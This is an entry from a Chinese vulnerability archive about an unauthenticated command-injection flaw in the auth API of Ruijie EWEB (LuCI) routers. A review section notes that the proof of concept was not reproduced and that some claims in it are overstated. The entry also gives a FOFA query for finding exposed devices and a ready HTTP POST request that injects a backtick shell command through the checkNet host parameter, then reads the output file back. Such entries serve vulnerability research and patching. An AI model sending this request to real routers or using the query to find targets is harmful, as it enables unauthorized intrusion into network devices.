---
source: "wy876 漏洞文库"
id: "vw-da273f250303ddcfd14d2fdd"
entity_id: "ve-da273f250303ddcfd14d2fdd"
schema_version: "1"
fofa_unverified: "body="
title: "锐捷 EWEB路由器 auth 远程命令执行漏洞"
product: "Ruijie睿易 LuCI EWEB"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie示例；型号固件未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7EWEB%E8%B7%AF%E7%94%B1%E5%99%A8auth%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/vx00xdatfw3yw8px"
source_status: "recorded"
---

# 锐捷 EWEB路由器 auth 远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie睿易 LuCI EWEB
- 本文讨论：api/auth checkNet params.host命令注入
- 版本、权限与配置前提：无Cookie示例；型号固件未给
- 资料类型：JSON命令注入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 睿易LuCI产品与EG PHP EWEB应按具体型号分离
- 写固定标记后仅给回读路径，无结果/根因/鉴权证据；fofa元数据残缺
- 笼统可控制整个web服务器超出展示证据
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 前端auth路由是否需要额外token、版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
锐捷睿易是锐捷网络面向商务市场的子品牌。拥有便捷的网络、交换机、路由器、无线、安全、云服务六大产品线，解决方案涵盖商业零售、酒店、kt、网吧、监控与安全、物流、仓储、制造。通过该漏洞，攻击者可以任意执行服务器端的代码，编写后门，获得服务器权限，进而控制整个web服务器。

# 二、影响版本
+ 锐捷 EWEB路由器

# 三、资产测绘
+ fofa`body="cgi-bin/luci" && body="#f47f3e"`
+ 特征


# 四、漏洞复现
```http
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: 
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{"method":"checkNet","params":{"host":"`echo c149136B>AD0D5b8c.txt`"}}
```


获取命令执行结果

```plain
/cgi-bin/AD0D5b8c.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vx00xdatfw3yw8px>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
